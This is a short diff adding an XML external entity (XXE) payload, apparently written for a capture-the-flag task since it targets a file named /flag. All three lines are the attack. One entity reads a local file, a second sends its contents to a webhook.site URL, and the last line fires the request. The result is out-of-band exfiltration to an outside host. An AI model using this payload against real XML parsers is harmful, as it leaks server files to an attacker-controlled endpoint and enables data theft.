@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % send SYSTEM "https://webhook.site/f9172f99-e1a0-45fe-b089-3e7c073605ee/?leak=%file;">
+%send;
